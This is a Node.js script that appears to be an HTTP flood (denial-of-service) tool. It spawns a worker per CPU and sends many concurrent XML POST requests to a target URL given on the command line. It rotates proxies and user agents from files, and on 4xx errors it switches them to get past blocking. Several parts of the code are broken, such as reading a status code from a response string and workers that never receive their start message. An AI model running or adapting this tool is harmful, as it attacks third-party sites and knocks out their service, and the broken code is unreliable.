const http = require('http');
const fs = require('fs');
const url = require('url');
const querystring = require('querystring');
const Agentkeepalive = require('agentkeepalive');
const Cluster = require('cluster');
const numCPUs = require('os').cpus().length;
const worker_threads = require('worker_threads');

// Read user agents and proxies
const uaList = fs.readFileSync('ua.txt').toString().split('\n');
const proxyList = fs.readFileSync('proxy.txt').toString().split('\n');

// Read data xml
const xmlData = fs.readFileSync('data.xml').toString();

const args = process.argv.slice(2);
const urlToRequest = args[0];
const runtime = args[1];
const threadCount = args[2];

let currentProxyIndex = 0;
let currentUserAgentIndex = 0;

function getRandomInt(max) {
  return Math.floor(Math.random() * Math.floor(max));
}

function sendRequest(xmlData, options) {
  return new Promise((resolve, reject) => {
    const req = http.request(options, (res) => {
      let data = '';
      res.on('data', (chunk) => {
        data += chunk;
      });
      res.on('end', () => {
        resolve(data);
      });
    });
    req.on('error', (error) => {
      reject(error);
    });
    req.write(xmlData);
    req.end();
  });
}

async function sendRequests() {
  const options = url.parse(urlToRequest);
  options.method = 'POST';
  options.headers = {
    'Content-Type': 'application/xml',
    'User-Agent': uaList[currentUserAgentIndex],
  };

  // Use random proxy
  if (proxyList[currentProxyIndex]) {
    const keepaliveAgent = new Agentkeepalive({
      maxSockets: 1,
      maxFreeSockets: 1,
      timeout: 60000,
      keepAliveTimeout: 30000,
    });
    options.agent = keepaliveAgent;
    proxyUrl = url.parse(proxyList[currentProxyIndex]);
    options.hostname = proxyUrl.hostname;
    options.port = proxyUrl.port;
    options.path = urlToRequest;
    options.headers.host = urlToRequest.hostname;
  }

  // Send request
  const result = await sendRequest(xmlData, options);

  // Handle bad response
  if (result.statusCode >= 400 && result.statusCode <= 499) {
    console.log(`Bad response: ${result.statusCode}`);
    currentProxyIndex = getRandomInt(proxyList.length);
    currentUserAgentIndex = getRandomInt(uaList.length);
    return sendRequests();
  }
  else {
    // Log status code every 5 seconds
    setInterval(() => { 
      console.log(`Status code: ${result.statusCode}`); 
    }, 5000);
  }

  return result;
}

async function run() {
  const startTime = new Date().getTime();
  const promises = [];
  if (Cluster.isMaster) {
    for (let i = 0; i < numCPUs; i++) {
      Cluster.fork();
    }
  } else {
    for (let i = 0; i < threadCount; i++) {
      promises.push(sendRequests());
    }
    const results = await Promise.all(promises);
    console.log(results);
  }

  const endTime = new Date().getTime();
  console.log(`Total runtime: ${endTime - startTime}ms`);
  console.log(`Memory usage: ${process.memoryUsage().rss / 1024 / 1024} MB`);
  console.log(`CPU usage: ${process.cpuUsage().system / 1000} ms`);
  Cluster.disconnect();
}

if (Cluster.isMaster) {
  run();
} else {
  worker_threads.parentPort.once('message', () => {
    run();
  });
}
